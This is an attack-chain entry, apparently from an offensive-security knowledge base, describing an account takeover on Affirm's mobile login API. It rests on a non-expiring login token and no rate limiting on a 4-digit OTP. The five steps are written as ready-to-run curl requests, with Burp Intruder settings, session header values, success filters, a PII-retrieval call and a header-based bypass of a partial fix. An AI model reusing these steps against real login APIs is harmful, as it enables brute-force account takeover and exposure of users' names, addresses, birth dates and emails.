---
tags:
  - brute-force
  - otp
  - api-auth-bypass
  - account-takeover
  - mobile-vulnerability
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Mobile
  - Web
  - Android
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Generate-Login-Token-with-Phone-Number]]'
  - '[[procedures/Brute-Force-OTP-Using-Token-Endpoint]]'
  - '[[procedures/Authenticate-and-Obtain-Session-with-Affirm-Client]]'
  - '[[procedures/Access-User-Details-via-API]]'
  - '[[procedures/Bypass-Fix-with-Required-Headers-for-Brute-Force]]'
step_count: 5
techniques:
  - '[[Brute Force]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:47.324Z'
description: >-
  Multi-stage attack exploiting lack of token expiry and rate limiting in
  Affirm's mobile login API to brute-force 4-digit OTP, authenticate, and access
  sensitive user data for full account takeover.
skill_level: intermediate
impact_level: high
id: a49c0646-a183-4f60-b57c-5bb9b2124baf
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
  - '[[Valid Accounts]]'
---
# Affirm Account Takeover via Brute-Force OTP on Non-Expiring Login Token

Multi-stage attack chain demonstrating exploitation of Affirm's mobile login API vulnerability, where login tokens do not expire and lack rate limiting, allowing unlimited brute-force attempts on a 4-digit OTP to achieve unauthorized authentication and full account takeover, exposing PII like phone, name, address, DOB, and email.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Generate Login Token] --> B[Brute-Force OTP]
    B --> C[Authenticate Session]
    C --> D[Access User Data]
    D --> E[Bypass Fix if Needed]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
    style E fill:#9b59b6
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Mobile API endpoints on Affirm's server (e.g., hackerone.affirm-odin.com)
- Required services: SMS for OTP delivery
- Tech stack: openresty, JSON APIs, Android app emulation
- Network access: Direct HTTP access to API

### Initial Access Requirements

- Target phone number (e.g., 7022170000 without +1 or dashes)
- No prior credentials needed; public-facing API
- Intercept mobile app traffic or emulate requests

## Detailed Attack Procedures

### Step 1: Generate Login Token
procedure: [[procedures/Generate-Login-Token-with-Phone-Number]]

**Objective**: Initiate the login flow by submitting a phone number to obtain a non-expiring login token for OTP submission.

**Instructions**: Use [[commands/initiate-sms-login-token]] to send a POST request with the target phone number:

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -d '{"channel":"sms","address":"7022170000"}'
```

**Expected Output**: HTTP 200 with JSON response containing "response_url" like "/api/v3/login/phone/SOMETOKEN".

**Success Indicators**:
- Token generated in response_url
- No errors in response

### Step 2: Brute-Force OTP
procedure: [[procedures/Brute-Force-OTP-Using-Token-Endpoint]]

**Objective**: Exploit the lack of rate limiting to guess the 4-digit OTP by sending multiple requests to the token endpoint using Burp Intruder.

**Instructions**: Capture the OTP submission request in Burp Suite and send to Intruder. Mark the 'response' value as payload position. Use [[commands/submit-otp-for-auth]] as base, varying "response" from 0000 to 9999:

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/SOMETOKEN \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22" \
  -d '{"response":"0000"}'
```

Configure Intruder to attack with numbers 0000-9999, filter by 200 status and response length ~109.

**Expected Output**: On success, HTTP 200 with {"status": "authenticated", "user_id": "1479-5770-XGGL"}.

**Success Indicators**:
- 200 status and 'authenticated' in response
- User ID extracted

### Step 3: Authenticate and Obtain Session
procedure: [[procedures/Authenticate-and-Obtain-Session-with-Affirm-Client]]

**Objective**: Use the successful authentication to capture the session via Affirm-Client header for further API access.

**Instructions**: From the successful OTP response, extract the Affirm-Client header value (session ID) and user_id.

**Expected Output**: Affirm-Client header like ".eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk".

**Success Indicators**:
- Valid session header obtained
- User ID present

### Step 4: Access User Details
procedure: [[procedures/Access-User-Details-via-API]]

**Objective**: Leverage the session to retrieve sensitive user PII from the user profile endpoint.

**Instructions**: Use [[commands/retrieve-user-profile]] with the Affirm-Client header and user_id:

```bash
curl -X GET https://hackerone.affirm-odin.com/api/v2/users/1479-5770-XGGL \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk" \
  -H "Affirm-Platform: android" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22"
```

**Expected Output**: HTTP 200 with JSON containing phone_number, name, address, dob, email.

**Success Indicators**:
- PII data retrieved
- No 401 unauthorized

### Step 5: Bypass Initial Fix
procedure: [[procedures/Bypass-Fix-with-Required-Headers-for-Brute-Force]]

**Objective**: After an initial partial fix requiring headers, include Affirm-Client and Affirm-Device to continue brute-forcing.

**Instructions**: Generate a new token with [[commands/initiate-sms-login-token-bypass]] using a different phone if needed, then submit OTP with headers using [[commands/submit-otp-with-headers]]:

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/{long_token} \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "Affirm-Device: eyJkZXZpY2VfaWQiOiAiZjM1MWU1NDEtNjVjZS00ZTVhLWI3NDMtYWYxZTcwMzRkNGNhIn0=" \
  -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJS8gs0CY0yDAuMcjcON7d0D1HSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAGUKGrU.EP8W9Q.zxALHtprHXz2S5Ik9O6gf2DmGos" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22" \
  -d '{"response":"0000"}'
```

Brute-force varying response, up to ~135 attempts possible.

**Expected Output**: HTTP 200 on valid OTP; 400 with length 629 on invalid.

**Success Indicators**:
- Authentication succeeds despite fix
- No rate limiting observed

## Attack Chain Summary

### Key Achievements

1. Generated non-expiring token for unlimited OTP attempts
2. Brute-forced 4-digit OTP leading to authentication
3. Obtained session and accessed full PII for account takeover
4. Bypassed partial fix by adding required headers

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Brute Force]] Brute Force
- [[Valid Accounts]] Valid Accounts

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
